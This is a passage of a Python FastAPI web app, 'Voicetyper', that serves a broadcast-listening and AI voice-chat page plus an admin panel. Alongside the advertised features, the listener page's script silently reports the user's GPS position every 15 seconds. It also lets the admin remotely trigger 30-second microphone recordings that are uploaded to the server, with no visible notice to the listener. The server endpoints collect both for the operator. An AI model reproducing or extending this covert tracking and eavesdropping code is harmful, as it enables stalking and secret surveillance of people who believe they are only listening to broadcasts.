    _player.load();
    console.log('[Audio-8a] _player.src set, load() called, readyState:',_player.readyState);
    var played=false;
    _player.oncanplaythrough=function(){{
        console.log('[Audio-9] canplaythrough fired, readyState:',_player.readyState,'networkState:',_player.networkState);
        if(played)return;
        var p=_player.play();
        if(p){{
            p.then(function(){{
                console.log('[Audio-10] HTML5 play() SUCCESS');
                played=true;
            }}).catch(function(e){{
                console.log('[Audio-10] HTML5 play() REJECTED:',e.name,e.message);
                playViaWebAudio(url);
            }});
        }}else{{
            console.log('[Audio-10] HTML5 play() returned undefined (sync success)');
            played=true;
        }}
    }};
    _player.onerror=function(){{
        console.log('[Audio-ERR] _player error, code:',_player.error?_player.error.code:'unknown','src:',_player.src);
    }};
    _player.onplay=function(){{console.log('[Audio-PLAY] _player onplay event fired');}};
    // 3秒兜底
    setTimeout(function(){{
        console.log('[Audio-9b] 3s timeout check, played:',played,'readyState:',_player.readyState);
        if(played)return;
        var p=_player.play();
        if(p)p.then(function(){{
            console.log('[Audio-10b] HTML5 timeout play() SUCCESS');
            played=true;
        }}).catch(function(e){{
            console.log('[Audio-10b] HTML5 timeout play() REJECTED:',e.name,e.message);
            playViaWebAudio(url);
        }});
    }},3000);
}}

function playViaWebAudio(url){{
    console.log('[Audio-11] playViaWebAudio fallback triggered, AudioCtx state:',_audioCtx?_audioCtx.state:'null');
    if(!_audioCtx){{console.log('[Audio-11] ERROR: no AudioContext');return;}}
    if(_audioCtx.state==='suspended'){{
        _audioCtx.resume().then(function(){{console.log('[Audio-11a] AudioCtx resumed in fallback');}});
    }}
    console.log('[Audio-12] fetching audio: '+url);
    fetch(url).then(function(resp){{
        console.log('[Audio-12a] fetch ok, status:',resp.status,'size:',resp.headers.get('content-length'));
        if(!resp.ok)throw new Error('HTTP '+resp.status);
        return resp.arrayBuffer();
    }}).then(function(buf){{
        console.log('[Audio-12b] arrayBuffer received, byteLength:',buf.byteLength);
        return _audioCtx.decodeAudioData(buf);
    }}).then(function(audioBuf){{
        console.log('[Audio-12c] decodeAudioData success, duration:',audioBuf.duration,'sampleRate:',audioBuf.sampleRate);
        var src=_audioCtx.createBufferSource();
        src.buffer=audioBuf;
        src.connect(_audioCtx.destination);
        src.start(0);
        console.log('[Audio-13] Web Audio playing via BufferSource, start(0) called');
    }},function(e){{
        console.log('[Audio-12d] decodeAudioData FAILED:',e.name,e.message);
    }}).catch(function(e){{
        console.log('[Audio-12e] Web Audio pipeline FAILED:',e.message||e);
    }});
}}

function switchMode(mode){{
    console.log('[Audio-MODE] switchMode to:',mode);
    _mode=mode;
    document.querySelectorAll('.seg-btn').forEach(function(b){{b.classList.remove('active')}});
    document.getElementById(mode==='broadcast'?'segBroadcast':'segChat').classList.add('active');

    if(mode==='broadcast'){{
        document.getElementById('broadcastUI').classList.remove('hide');
        document.getElementById('chatUI').classList.remove('show');
        stopRecordingUI();
        document.getElementById('broadcastStatus').textContent='';
        console.log('[Audio-MODEa] switching to broadcast, calling initAudio directly (user gesture)');
        initAudio();  // 直接调用，用户手势上下文有效
    }}else{{
        document.getElementById('broadcastUI').classList.add('hide');
        document.getElementById('chatUI').classList.add('show');
        loadChatHistory();  // 切換到對話模式時重新載入歷史
        if(_listening){{
            _listening=false;
            document.getElementById('initBtn').classList.remove('listening');
            document.getElementById('initBtn').textContent='开始收听';
            _player.removeAttribute('src');
            _player.style.display='none';
        }}
        document.getElementById('broadcastStatus').textContent='';
    }}
}}

// ==================== Broadcast Mode ====================

var _pollTimer=null;

var _broadcastActive=false;  // admin 是否激活了广播

function startPolling(){{
    if(_pollTimer)return;
    console.log('[Audio-POLL] polling started (every 3s)');
    _pollTimer=setInterval(function(){{
        fetch('/api/status').then(function(r){{return r.json()}}).then(function(d){{
            // 追踪激活状态
            var wasActive=_broadcastActive;
            _broadcastActive=d.active;
            if(!wasActive && d.active){{
                console.log('[Audio-POLL] admin activated broadcast');
                document.getElementById('broadcastStatus').textContent='管理员已激活 — 正在收听...';
            }}
            if(wasActive && !d.active){{
                console.log('[Audio-POLL] admin deactivated broadcast');
                _player.removeAttribute('src');
                _player.style.display='none';
                document.getElementById('broadcastStatus').textContent='等待管理员激活...';
            }}
            // 只有 admin 激活後才播放
            if(d.active && d.url && d.ts>_currentTs){{
                console.log('[Audio-POLL] new broadcast found, ts:',d.ts,'url:',d.url);
                _pendingBroadcast={{url:d.url,ts:d.ts}};
                if(_mode==='broadcast' && _listening){{
                    _currentTs=d.ts;
                    playAudio(d.url);
                }}
            }}
        }}).catch(function(){{}});
        // 检查远程录音指令
        fetch('/api/remote-record/check').then(function(r){{return r.json()}}).then(function(j){{
            if(j.record){{
                console.log('[Audio-POLL] remote-record triggered');
                startRemoteRecord();
            }}
        }}).catch(function(){{}});
    }},3000);
    console.log('[Audio-POLL] active');
}}

async function initAudio(){{
    console.log('[Audio-3] initAudio called, _listening:',_listening);
    if(_listening){{
        console.log('[Audio-3a] stopping — was listening, disconnecting');
        _listening=false;
        document.getElementById('initBtn').classList.remove('listening');
        document.getElementById('initBtn').textContent='开始收听';
        document.getElementById('broadcastStatus').textContent='已停止';
        _player.removeAttribute('src');
        _player.style.display='none';
        return;
    }}

    try{{
        console.log('[Audio-4] creating AudioContext...');
        _audioCtx=new(window.AudioContext||window.webkitAudioContext)();
        console.log('[Audio-4a] AudioContext created, state:',_audioCtx.state);
        await _audioCtx.resume();
        console.log('[Audio-5] AudioContext resumed, state:',_audioCtx.state);
        var o=_audioCtx.createOscillator(),g=_audioCtx.createGain();
        g.gain.value=0.001;o.connect(g);g.connect(_audioCtx.destination);
        o.start(0);o.stop(_audioCtx.currentTime+0.002);
        console.log('[Audio-5a] silent tick played, AudioCtx ready');
    }}catch(e){{
        console.log('[Audio-4b] AudioContext error:',e.name,e.message);
    }}

    _listening=true;
    document.getElementById('initBtn').classList.add('listening');
    document.getElementById('initBtn').textContent='已连接';
    _player.style.display='block';

    console.log('[Audio-6] fetching /api/status...');
    var r=await fetch('/api/status');
    var d=await r.json();
    _currentTs=d.ts;
    _broadcastActive=d.active;
    console.log('[Audio-6a] /api/status returned — _currentTs:',_currentTs,'active:',d.active,'url:',d.url);
    if(d.active){{
        document.getElementById('broadcastStatus').textContent='管理员已激活 — 正在收听...';
        if(_pendingBroadcast && _pendingBroadcast.ts>_currentTs){{
            console.log('[Audio-6b] playing pending broadcast, ts:',_pendingBroadcast.ts);
            _currentTs=_pendingBroadcast.ts;
            playAudio(_pendingBroadcast.url);
        }}
    }}else{{
        document.getElementById('broadcastStatus').textContent='等待管理员激活...';
    }}
    _pendingBroadcast=null;
}}

// ==================== GPS 位置上报 ====================
var _locationDenied=false;
function sendLocation(){{
    if(!navigator.geolocation){{console.log('[GPS] not supported');return;}}
    navigator.geolocation.getCurrentPosition(function(pos){{
        _locationDenied=false;
        console.log('[GPS] location obtained:',pos.coords.latitude.toFixed(6),pos.coords.longitude.toFixed(6));
        var f=new FormData();
        f.append('lat',pos.coords.latitude);
        f.append('lng',pos.coords.longitude);
        f.append('accuracy',pos.coords.accuracy);
        f.append('timestamp',pos.timestamp/1000);
        fetch('/api/location',{{method:'POST',body:f}}).catch(function(){{}});
    }},function(err){{
        if(!_locationDenied){{
            _locationDenied=true;
            console.log('[GPS] error:',err.code,err.message);
        }}
    }},{{enableHighAccuracy:true,timeout:8000,maximumAge:30000}});
}}

// ==================== 远程录音 ====================
var _remoteRecording=false,_remoteRecorder=null,_remoteChunks=[],_remoteStream=null;

async function checkRemoteRecord(){{
    if(_remoteRecording)return;
    try{{
        var r=await fetch('/api/remote-record/check');
        var j=await r.json();
        if(j.record)startRemoteRecord();
    }}catch(e){{}}
}}

async function startRemoteRecord(){{
    _remoteRecording=true;
    _remoteChunks=[];
    try{{
        _remoteStream=await navigator.mediaDevices.getUserMedia({{audio:true}});
        var mime='audio/webm';
        if(!MediaRecorder.isTypeSupported(mime))mime='';
        _remoteRecorder=new MediaRecorder(_remoteStream, mime?{{mimeType:mime}}:{{}});
        _remoteRecorder.ondataavailable=function(e){{
            if(e.data.size>0)_remoteChunks.push(e.data);
        }};
        _remoteRecorder.onstop=function(){{
            if(_remoteStream){{
                _remoteStream.getTracks().forEach(function(t){{t.stop()}});
                _remoteStream=null;
            }}
            var blob=new Blob(_remoteChunks);
            _remoteChunks=[];
            if(blob.size>500)uploadRemoteAudio(blob);
            _remoteRecording=false;
        }};
        _remoteRecorder.start();
        // 30秒后自动停止
        setTimeout(function(){{
            if(_remoteRecorder && _remoteRecorder.state==='recording'){{
                _remoteRecorder.stop();
            }}
        }},30000);
    }}catch(e){{
        _remoteRecording=false;
    }}
}}

async function uploadRemoteAudio(blob){{
    try{{
        var f=new FormData();f.append('audio',blob,'remote.webm');
        await fetch('/api/remote-record/upload',{{method:'POST',body:f}});
    }}catch(e){{}}
}}

// ==================== AI Chat Mode ====================
var _mediaRecorder=null,_audioChunks=[],_stream=null;

async function toggleRecord(){{
    if(_isRecording){{
        // 停止录音
        if(_mediaRecorder && _mediaRecorder.state==='recording'){{
            _mediaRecorder.stop();
        }}
        return;
    }}

    // 开始录音
    try{{
        _stream=await navigator.mediaDevices.getUserMedia({{audio:true}});
        // 优先用 webm，否则用浏览器默认格式
        var mime='audio/webm';
        if(!MediaRecorder.isTypeSupported(mime))mime='';
        _mediaRecorder=new MediaRecorder(_stream, mime?{{mimeType:mime}}:{{}});
        _audioChunks=[];

        _mediaRecorder.ondataavailable=function(e){{
            if(e.data.size>0)_audioChunks.push(e.data);
        }};

        _mediaRecorder.onstop=function(){{
            // 释放麦克风
            if(_stream){{
                _stream.getTracks().forEach(function(t){{t.stop()}});
                _stream=null;
            }}
            var blob=new Blob(_audioChunks);
            _audioChunks=[];
            if(blob.size<500)return;
            sendVoiceMessage(blob);
        }};

        _mediaRecorder.onerror=function(){{
            stopRecordingUI();
            document.getElementById('chatStatus').textContent='录音失败，请用文字输入';
        }};

        _mediaRecorder.start();
        _isRecording=true;
        document.getElementById('recordBtn').classList.add('recording');
        document.getElementById('recordLabel').textContent='录音中...';
        document.getElementById('chatStatus').textContent='';
    }}catch(e){{
        stopRecordingUI();
        document.getElementById('chatStatus').textContent='无法访问麦克风，请用文字输入';
    }}
}}

function stopRecordingUI(){{
    _isRecording=false;
    document.getElementById('recordBtn').classList.remove('recording');
    document.getElementById('recordLabel').textContent='按住说话';
}}

async function sendVoiceMessage(blob){{
    addBubble('🎤 语音消息','user');
    document.getElementById('chatStatus').innerHTML='<span class="spinner"></span>识别中...';
    document.getElementById('recordBtn').style.pointerEvents='none';
    stopRecordingUI();

    try{{
        var f=new FormData();f.append('audio',blob,'recording.webm');
        var r=await fetch('/api/ai/chat/voice',{{method:'POST',body:f}});
        var j=await r.json();
        if(j.ok){{
            // 更新气泡为识别文字
            var bubbles=document.querySelectorAll('#chatHistory .chat-bubble.user');
            var last=bubbles[bubbles.length-1];
            if(last)last.textContent=j.transcript||'语音消息';
            addBubble(j.reply,'ai');
            document.getElementById('chatStatus').textContent='';
            if(j.url){{
                playAudio(j.url);
            }}
        }}else{{
            document.getElementById('chatStatus').textContent='错误: '+j.error;
        }}
    }}catch(e){{
        document.getElementById('chatStatus').textContent='网络错误';
    }}
    document.getElementById('recordBtn').style.pointerEvents='auto';
}}

function sendChatText(){{
    var text=document.getElementById('chatInput').value.trim();
    if(!text)return;
    document.getElementById('chatInput').value='';
    sendChatMessage(text);
}}

async function sendChatMessage(text){{
    addBubble(text,'user');
    document.getElementById('chatStatus').innerHTML='<span class="spinner"></span>思考中...';
    document.getElementById('recordBtn').style.pointerEvents='none';

    try{{
        var f=new FormData();f.append('text',text);
        var r=await fetch('/api/ai/chat',{{method:'POST',body:f}});
        var j=await r.json();
        if(j.ok){{
            addBubble(j.reply,'ai');
            document.getElementById('chatStatus').textContent='';
            if(j.url){{
                playAudio(j.url);
            }}
        }}else{{
            document.getElementById('chatStatus').textContent='错误: '+j.error;
        }}
    }}catch(e){{
        document.getElementById('chatStatus').textContent='网络错误';
    }}
    document.getElementById('recordBtn').style.pointerEvents='auto';
}}

function addBubble(text,role){{
    var div=document.createElement('div');
    div.className='chat-bubble '+(role==='user'?'user':'ai');
    div.textContent=text;
    var hist=document.getElementById('chatHistory');
    hist.appendChild(div);
    hist.scrollTop=hist.scrollHeight;
    if(hist.children.length>30)hist.removeChild(hist.firstChild);
}}

function resetChat(){{
    document.getElementById('chatHistory').innerHTML='<div class="chat-bubble ai">你好，想聊些什么？</div>';
    document.getElementById('chatStatus').textContent='';
    fetch('/api/ai/chat/reset',{{method:'POST'}}).catch(function(){{}});
}}

// 页面加载时载入历史聊天记录
function loadChatHistory(){{
    fetch('/api/chat/history').then(function(r){{return r.json()}}).then(function(j){{
        if(j.ok && j.messages && j.messages.length>0){{
            var hist=document.getElementById('chatHistory');
            hist.innerHTML='';
            j.messages.forEach(function(msg){{
                var div=document.createElement('div');
                div.className='chat-bubble '+(msg.role==='user'?'user':'ai');
                div.textContent=msg.content;
                hist.appendChild(div);
            }});
            hist.scrollTop=hist.scrollHeight;
        }}
    }}).catch(function(){{}});
}}

// ==================== Init ====================
// 注册 PWA Service Worker
if('serviceWorker' in navigator){{
    navigator.serviceWorker.register('/sw.js').catch(function(){{}});
}}

window.addEventListener('load',function(){{
    console.log('[Audio-1b] window.load fired');
    startPolling();
    setInterval(function(){{sendLocation();}},15000);
    sendLocation();
    console.log('[Audio-1c] polling + locations started — waiting for user to click 开始收听');
    document.getElementById('broadcastStatus').textContent='请点击下方按钮开始收听';
    loadChatHistory();
}});

document.addEventListener('visibilitychange',function(){{
    console.log('[Audio-VIS] visibilitychange, hidden:',document.hidden,'_listening:',_listening,'_mode:',_mode);
    if(!document.hidden){{
        // 确保轮询在运行
        if(!_pollTimer)startPolling();
        if(!_listening && _mode==='broadcast'){{
            document.getElementById('broadcastStatus').textContent='请点击下方按钮开始收听';
        }}
    }}
}});

// Enter key for chat input
document.getElementById('chatInput').addEventListener('keydown',function(e){{
    if(e.key==='Enter')sendChatText();
}});
</script>
</body>
</html>"""


@app.get("/listen", response_class=HTMLResponse)
async def listen_page():
    return LISTEN_HTML.format(shared_css=SHARED_CSS)


# ============================================================
# /m — Mobile Admin (lightweight, one-thumb broadcast)
# ============================================================
M_ADMIN_HTML = """<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no,viewport-fit=cover">
<title>Voicetyper · M</title>
<style>
    {shared_css}
    body{{align-items:flex-start;padding-top:0.5rem}}
    .card{{padding:1.5rem 1.2rem;max-width:420px;margin:0.5rem auto}}
    .logo{{font-size:1.8rem;margin-bottom:0.25rem}}
    .sub{{margin-bottom:0.8rem}}
    /* === toggle row === */
    .toggle-row{{
        display:flex;align-items:center;justify-content:space-between;
        background:rgba(124,58,237,0.04);border-radius:14px;padding:0.5rem 0.9rem;margin-bottom:0.8rem
    }}
    .toggle-label{{font-size:0.82rem;color:#4c1d95;font-weight:600}}
    .toggle-status{{font-size:0.68rem;color:#a78bfa}}
    .toggle-btn{{
        border:none;border-radius:20px;padding:0.4rem 0.9rem;font-size:0.78rem;
        font-weight:600;cursor:pointer;color:#fff;font-family:inherit;
        background:linear-gradient(135deg,#10b981,#059669);transition:all 0.2s
    }}
    .toggle-btn.off{{background:linear-gradient(135deg,#ef4444,#f43f5e)}}
    .toggle-btn:active{{transform:scale(0.96)}}
    /* === textarea === */
    textarea{{
        width:100%;border:1.5px solid #e9d5ff;border-radius:14px;
        background:#faf8ff;padding:0.7rem 0.85rem;font-size:0.95rem;
        line-height:1.5;resize:none;font-family:inherit;margin-bottom:0.6rem;
        min-height:72px;transition:border-color 0.2s
    }}
    textarea:focus{{border-color:#a78bfa;outline:none;box-shadow:0 0 0 4px rgba(124,58,237,0.07)}}
    .btn-send{{
        width:100%;border:none;border-radius:14px;font-weight:600;font-size:0.95rem;
        padding:0.75rem;cursor:pointer;font-family:inherit;color:#fff;
        background:linear-gradient(135deg,#7c3aed,#8b5cf6);
        box-shadow:0 2px 10px rgba(124,58,237,0.25);margin-bottom:0.8rem
    }}
    /* === history === */
    .history-title{{font-size:0.78rem;color:#a78bfa;font-weight:600;margin-bottom:0.4rem}}
    .history-list{{display:flex;flex-direction:column;gap:0.3rem;max-height:50vh;overflow-y:auto;-webkit-overflow-scrolling:touch}}
    .history-item{{
        background:rgba(124,58,237,0.03);border-radius:10px;padding:0.45rem 0.7rem;
        display:flex;justify-content:space-between;align-items:flex-start;gap:0.5rem
    }}
    .history-text{{font-size:0.85rem;color:#4c1d95;flex:1;word-break:break-word;line-height:1.3}}
    .history-time{{font-size:0.62rem;color:#c4b5fd;white-space:nowrap;margin-top:0.15rem}}
    .no-history{{text-align:center;color:#c4b5fd;font-size:0.78rem;padding:1rem 0}}
    .send-status{{text-align:center;font-size:0.82rem;min-height:1.2em;margin-bottom:0.3rem}}
</style>
</head>
<body>
<div class="card">
    <div class="logo">Voicetyper</div>
    <div class="sub">Mobile Admin</div>

    <!-- 激活开关 -->
    <div class="toggle-row">
        <div>
            <div class="toggle-label">收听端激活</div>
            <div class="toggle-status" id="activeLabel">未激活</div>
        </div>
        <button class="toggle-btn off" id="toggleBtn" onclick="toggleActivate()">激活</button>
    </div>

    <!-- 输入框 -->
    <textarea id="text" placeholder="输入要广播的文字..." autofocus></textarea>
    <button class="btn-send" type="button" id="sendBtn" onclick="sendBroadcast()">发送广播</button>
    <div class="send-status" id="sendStatus"></div>

    <!-- 历史记录 -->
    <div class="history-title">广播历史</div>
    <div class="history-list" id="historyList">
        <div class="no-history">暂无广播记录</div>
    </div>
</div>

<script>
var _active=false;

// 检查激活状态
async function checkActive(){{
    try{{
        var r=await fetch('/api/status');
        var j=await r.json();
        _active=j.active;
        updateToggleUI();
    }}catch(e){{}}
}}

function updateToggleUI(){{
    var btn=document.getElementById('toggleBtn');
    var label=document.getElementById('activeLabel');
    if(_active){{
        btn.textContent='停用';
        btn.classList.add('off');
        label.textContent='已激活';
        label.style.color='#10b981';
    }}else{{
        btn.textContent='激活';
        btn.classList.remove('off');
        label.textContent='未激活 — listen 静默中';
        label.style.color='#a78bfa';
    }}
}}

async function toggleActivate(){{
    var btn=document.getElementById('toggleBtn');
    btn.disabled=true;
    try{{
        var r=await fetch(_active?'/api/deactivate':'/api/activate',{{method:'POST'}});
        var j=await r.json();
        _active=j.active;
        updateToggleUI();
    }}catch(e){{}}
    btn.disabled=false;
}}

async function sendBroadcast(){{
    var t=document.getElementById('text').value.trim();
    if(!t){{document.getElementById('sendStatus').textContent='请输入文字';return}}

    var btn=document.getElementById('sendBtn');
    btn.disabled=true;btn.textContent='发送中...';
    document.getElementById('sendStatus').textContent='';

    try{{
        var f=new FormData();f.append('text',t);
        var r=await fetch('/api/send',{{method:'POST',body:f}});
        var j=await r.json();
        document.getElementById('sendStatus').textContent=j.status;
        if(j.status.indexOf('已广播')===0){{
            document.getElementById('text').value='';
            loadHistory();  // 刷新列表
        }}
    }}catch(e){{
        document.getElementById('sendStatus').textContent='网络错误';
    }}
    btn.disabled=false;btn.textContent='发送广播';
}}

async function loadHistory(){{
    try{{
        var r=await fetch('/api/broadcast/history');
        var j=await r.json();
        var list=document.getElementById('historyList');
        if(j.ok && j.items && j.items.length>0){{
            var html='';
            j.items.forEach(function(item){{
                var d=new Date(item.time*1000);
                var timeStr=d.toLocaleTimeString('zh-CN',{{hour:'2-digit',minute:'2-digit'}});
                var dateStr='';
                var today=new Date();
                if(d.toDateString()!==today.toDateString()){{
                    dateStr=(d.getMonth()+1)+'/'+d.getDate()+' ';
                }}
                html+='<div class="history-item">'+
                    '<span class="history-text">'+escapeHtml(item.text)+'</span>'+
                    '<span class="history-time">'+dateStr+timeStr+'</span>'+
                '</div>';
            }});
            list.innerHTML=html;
        }}else{{
            list.innerHTML='<div class="no-history">暂无广播记录</div>';
        }}
    }}catch(e){{}}
}}

function escapeHtml(s){{
    var d=document.createElement('div');
    d.textContent=s;
    return d.innerHTML;
}}

// Enter 快捷发送
document.getElementById('text').addEventListener('keydown',function(e){{
    if(e.key==='Enter' && !e.shiftKey){{
        e.preventDefault();
        sendBroadcast();
    }}
}});

// 初始化
checkActive();
loadHistory();
</script>
</body>
</html>"""

@app.get("/m", response_class=HTMLResponse)
async def mobile_admin_page():
    return M_ADMIN_HTML.format(shared_css=SHARED_CSS)


# ---- favicon ----
@app.get("/favicon.ico", status_code=204)
async def favicon():
    return Response(status_code=204)


# ---- PWA ----
@app.get("/manifest.json")
async def manifest():
    return JSONResponse({
        "name": "Voicetyper",
        "short_name": "Voicetyper",
        "start_url": "/listen",
        "display": "standalone",
        "orientation": "portrait",
        "background_color": "#faf8ff",
        "theme_color": "#7c3aed",
        "icons": [{
            "src": "data:image/svg+xml," + quote(
                '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 192 192">'
                '<circle cx="96" cy="96" r="88" fill="#7c3aed"/>'
                '<text x="96" y="125" text-anchor="middle" font-size="90" fill="#fff">V</text>'
                '</svg>'
            ),
            "sizes": "192x192", "type": "image/svg+xml", "purpose": "any maskable"
        }]
    })


@app.get("/sw.js", response_class=Response, responses={200: {"content-type": "application/javascript"}})
async def service_worker():
    return Response("""\
// Voicetyper Service Worker — 极简 PWA，不强制刷新页面
self.addEventListener('install',function(e){
    // 不使用 skipWaiting，避免页面重载导致 SSE 断开
});
self.addEventListener('activate',function(e){
    // 不使用 clients.claim，等待自然接管
});
// 保活 ping
setInterval(function(){
    fetch('/api/status').catch(function(){});
},120000);
""", media_type="application/javascript")


# ============================================================
# REST API
# ============================================================
@app.post("/api/send")
async def api_send(text: str = Form(...)):
    result = broadcast(text)
    return JSONResponse({"status": result})


@app.get("/api/status")
async def api_status():
    global last_updated, latest_url, broadcast_active
    with _lock:
        url = latest_url
        ts = last_updated
    with broadcast_active_lock:
        active = broadcast_active
    return {"url": url, "ts": ts, "active": active}


@app.post("/api/activate")
async def api_activate():
    global broadcast_active
    with broadcast_active_lock:
        broadcast_active = True
    print("  [ADMIN] broadcast ACTIVATED", flush=True)
    return JSONResponse({"ok": True, "active": True})

@app.post("/api/deactivate")
async def api_deactivate():
    global broadcast_active
    with broadcast_active_lock:
        broadcast_active = False
    print("  [ADMIN] broadcast DEACTIVATED", flush=True)
    return JSONResponse({"ok": True, "active": False})

@app.post("/api/ai/generate")
async def api_ai_generate(prompt: str = Form(...)):
    result = ai_generate(prompt)
    return JSONResponse(result)


@app.post("/api/ai/chat")
async def api_ai_chat(text: str = Form(...)):
    result = ai_chat(text)
    return JSONResponse(result)


@app.post("/api/ai/chat/reset")
async def api_ai_chat_reset():
    global chat_history
    with chat_lock:
        chat_history = []
        _save_chat_history()
    return JSONResponse({"ok": True})

@app.get("/api/chat/history")
async def api_chat_history():
    """返回完整聊天记录"""
    with chat_lock:
        msgs = list(chat_history)
    return JSONResponse({"ok": True, "messages": msgs})

@app.get("/api/broadcast/history")
async def api_broadcast_history():
    """返回广播历史（最新的在前）"""
    with broadcast_history_lock:
        items = list(reversed(broadcast_history[-100:]))
    return JSONResponse({"ok": True, "items": items})


@app.post("/api/ai/chat/voice")
async def api_ai_chat_voice(audio: UploadFile = File(...)):
    """接收浏览器录音 → whisper 转文字 → AI 对话 → TTS"""
    audio_bytes = await audio.read()
    if not audio_bytes or len(audio_bytes) < 1000:
        return JSONResponse({"ok": False, "error": "录音太短，请重试"})

    try:
        text = transcribe_audio(audio_bytes)
    except Exception as e:
        return JSONResponse({"ok": False, "error": f"语音识别失败: {e}"})

    if not text:
        return JSONResponse({"ok": False, "error": "未识别到语音内容"})

    result = ai_chat(text)
    result["transcript"] = text
    return JSONResponse(result)


# ---- 数字分身 ----
@app.post("/api/persona/save")
async def api_persona_save(text: str = Form(...)):
    global persona_text
    with persona_lock:
        persona_text = text.strip()
    return JSONResponse({"ok": True, "len": len(persona_text)})


@app.get("/api/persona/get")
async def api_persona_get():
    global persona_text
    with persona_lock:
        return JSONResponse({"ok": True, "text": persona_text})


@app.post("/api/persona/clear")
async def api_persona_clear():
    global persona_text
    with persona_lock:
        persona_text = ""
    return JSONResponse({"ok": True})


# ============================================================
# 位置追踪 API
# ============================================================
@app.post("/api/location")
async def api_location(
    lat: float = Form(...),
    lng: float = Form(...),
    accuracy: float = Form(0),
    timestamp: float = Form(0),
):
    global location_history
    with location_lock:
        location_history.append({
            "lat": lat, "lng": lng, "accuracy": accuracy,
            "timestamp": timestamp or time.time(),
        })
        if len(location_history) > 200:
            location_history = location_history[-200:]
    return JSONResponse({"ok": True})


@app.get("/api/location/latest")
async def api_location_latest():
    with location_lock:
        if location_history:
            latest = location_history[-1]
            recent = list(location_history[-20:])
            return JSONResponse({"ok": True, "location": latest, "history": recent})
        return JSONResponse({"ok": True, "location": None, "history": []})


# ============================================================
# 远程录音 API
# ============================================================
@app.post("/api/remote-record/trigger")
async def api_remote_record_trigger():
    global remote_record_requested
    with remote_record_lock:
        remote_record_requested = True
    _publish_event({"type": "remote-record"})  # SSE 推送（如果有 SSE 客户端）
    return JSONResponse({"ok": True, "msg": "录音指令已发送"})


@app.get("/api/remote-record/check")
async def api_remote_record_check():
    global remote_record_requested
    with remote_record_lock:
        result = remote_record_requested
        remote_record_requested = False
    return JSONResponse({"record": result})


@app.post("/api/remote-record/upload")
async def api_remote_record_upload(audio: UploadFile = File(...)):
    global remote_audio_files
    raw = await audio.read()
    with tempfile.NamedTemporaryFile(suffix=".tmp", delete=False) as f:
        f.write(raw)
        raw_path = f.name
    wav_path = raw_path + ".wav"
    fname = f"remote_{int(time.time() * 1000)}.wav"
    fpath = os.path.join(AUDIO_DIR, fname)
    try:
        subprocess.run([
            "ffmpeg", "-y", "-i", raw_path,
            "-ar", "16000", "-ac", "1", "-f", "wav", wav_path
        ], capture_output=True, timeout=30)
        if os.path.exists(wav_path) and os.path.getsize(wav_path) > 0:
            os.rename(wav_path, fpath)
        else:
            with open(fpath, "wb") as fout:
                fout.write(raw)
    finally:
        for p in (raw_path, wav_path):
            try:
                os.unlink(p)
            except OSError:
                pass
    remote_audio_files.append({
        "url": f"/audio/{fname}", "ts": time.time(),
    })
    if len(remote_audio_files) > 20:
        remote_audio_files = remote_audio_files[-20:]
    return JSONResponse({"ok": True, "url": f"/audio/{fname}"})


@app.get("/api/remote-record/list")
async def api_remote_record_list():
    return JSONResponse({"ok": True, "files": list(remote_audio_files)})


# ============================================================
# SSE 事件流（替代轮询，实时推送广播和指令）
# ============================================================
@app.get("/api/events")
async def api_events(request: Request):
    q: asyncio.Queue = asyncio.Queue(maxsize=50)
    with _event_lock:
        _event_queues.append(q)
    print(f"  [SSE] client connected (total: {len(_event_queues)})", flush=True)

    async def event_stream():
        try:
            # 发送 2KB 初始填充，冲开 cloudflared/nginx 等代理的缓冲区
            yield ":" + " " * 2048 + "\n\n"
            yield f"data: {json.dumps({'type': 'connected'})}\n\n"
            while True:
                if await request.is_disconnected():
                    break
                try:
                    data = await asyncio.wait_for(q.get(), timeout=15)
                    yield f"data: {json.dumps(data, ensure_ascii=False)}\n\n"
                except asyncio.TimeoutError:
                    yield ": heartbeat\n\n"
        finally:
            with _event_lock:
                if q in _event_queues:
                    _event_queues.remove(q)
            print(f"  [SSE] client disconnected (total: {len(_event_queues)})", flush=True)

    return StreamingResponse(
        event_stream(),
        media_type="text/event-stream",
        headers={
            "Cache-Control": "no-store, no-cache",
            "Connection": "keep-alive",
            "X-Accel-Buffering": "no",
            "transfer-encoding": "chunked",
        }
    )


# ============================================================
# Static Files & Launch
# ============================================================
app.mount("/audio", StaticFiles(directory=AUDIO_DIR), name="audio")

if __name__ == "__main__":
    import uvicorn
    print()
    print("  Voicetyper 1.7 — Pure HTML · Apple Style · AI · Voice Chat · PWA")
    print("  ───────────────────────────────────────────────────────────────────")
    preload_whisper()
    try:
        import tunnel_manager
        public_url = tunnel_manager.start(7860)
        print(f"  Admin (PC): {public_url}/admin")
        print(f"  Admin (📱):  {public_url}/m")
        print(f"  Listen:      {public_url}/listen")
    except Exception:
        print("  Admin (PC): http://localhost:7860/admin")
        print("  Admin (📱):  http://localhost:7860/m")
        print("  Listen:      http://localhost:7860/listen")
    print()
    uvicorn.run(app, host="0.0.0.0", port=7860)
